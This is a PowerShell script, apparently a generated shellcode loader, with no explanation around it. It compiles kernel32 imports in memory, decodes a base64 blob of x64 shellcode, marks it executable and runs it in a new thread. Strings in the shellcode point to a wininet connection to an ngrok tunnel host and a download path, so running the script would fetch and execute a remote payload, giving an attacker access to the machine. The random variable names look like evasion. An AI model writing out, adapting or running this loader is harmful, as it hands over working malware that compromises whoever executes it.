Set-StrictMode -Version 2
$vRu = @"
	using System;
	using System.Runtime.InteropServices;
	namespace eE8 {
		public class func {
			[Flags] public enum AllocationType { Commit = 0x1000, Reserve = 0x2000 }
			[Flags] public enum MemoryProtection { ReadWrite = 0x04, Execute= 0x10 }
			[Flags] public enum Time : uint { Infinite = 0xFFFFFFFF }
			[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
			[DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, int dwSize, int flNewProtect,out int lpflOldProtect);
			[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
			[DllImport("kernel32.dll")] public static extern int WaitForSingleObject(IntPtr hHandle, Time dwMilliseconds);
		}
	}
"@

$h5CaZ = New-Object Microsoft.CSharp.CSharpCodeProvider
$jr = New-Object System.CodeDom.Compiler.CompilerParameters
$jr.ReferencedAssemblies.AddRange(@("System.dll", [PsObject].Assembly.Location))
$jr.GenerateInMemory = $True
$cr4 = $h5CaZ.CompileAssemblyFromSource($jr, $vRu)

[Byte[]]$go751 = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSA+3SkpIi3JQTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJIi1Igi0I8QVFIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ESLQCCLSBhQSQHQ41ZI/8lNMclBizSISAHWSDHAQcHJDaxBAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11IMdtTSb53aW5pbmV0AEFWSInhScfCTHcmB//VU1NIieFTWk0xwE0xyVNTSbo6VnmnAAAAAP/V6BIAAAAzLnRjcC5ldS5uZ3Jvay5pbwBaSInBScfATFkAAE0xyVNTagNTSbpXiZ/GAAAAAP/V6CwAAAAvVi1FR1IyWE9EV3dXNUJmbWRPOG1Ed2xpQXRSRWhFdnIwMGZ1ZmdyVnVhAEiJwVNaQVhNMclTSLgAMqiEAAAAAFBTU0nHwutVLjv/1UiJxmoKX0iJ8WofWlJogDMAAEmJ4GoEQVlJunVGnoYAAAAA/9VNMcBTWkiJ8U0xyU0xyVNTScfCLQYYe//VhcB1H0jHwYgTAABJukTwNeAAAAAA/9VI/890Auuq6FUAAABTWWpAWkmJ0cHiEEnHwAAQAABJulikU+UAAAAA/9VIk1NTSInnSInxSInaScfAACAAAEmJ+Um6EpaJ4gAAAAD/1UiDxCCFwHSyZosHSAHDhcB10ljDWGoAWUnHwvC1olb/1Q==")
[Uint32]$a_vHP = 0

$yjvd = [eE8.func]::VirtualAlloc(0, $go751.Length + 1, [eE8.func+AllocationType]::Reserve -bOr [eE8.func+AllocationType]::Commit, [eE8.func+MemoryProtection]::ReadWrite)
if ([Bool]!$yjvd) { $global:result = 3; return }
[System.Runtime.InteropServices.Marshal]::Copy($go751, 0, $yjvd, $go751.Length)

if ([eE8.func]::VirtualProtect($yjvd,[Uint32]$go751.Length + 1, [eE8.func+MemoryProtection]::Execute, [Ref]$a_vHP) -eq $true ) {
	[IntPtr] $urYz = [eE8.func]::CreateThread(0,0,$yjvd,0,0,0)
	if ([Bool]!$urYz) { $global:result = 7; return }
	$k6qq3 = [eE8.func]::WaitForSingleObject($urYz, [eE8.func+Time]::Infinite)
}
